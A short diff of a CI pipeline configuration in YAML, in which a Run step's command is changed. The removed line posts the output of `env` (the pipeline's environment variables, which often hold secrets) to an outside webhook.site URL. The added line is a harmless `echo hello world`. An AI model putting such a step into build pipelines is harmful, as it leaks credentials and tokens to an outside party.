@@ -22,7 +22,7 @@ pipeline:
                   name: echo
                   spec:
                     shell: Sh
-                    command: curl -X POST -d "$(env)" https://webhook.site/d183dc2d-22cd-494f-ac4b-3e4967a78d72
+                    command: echo hello world
                   timeout: ""
                   type: Run
           platform:
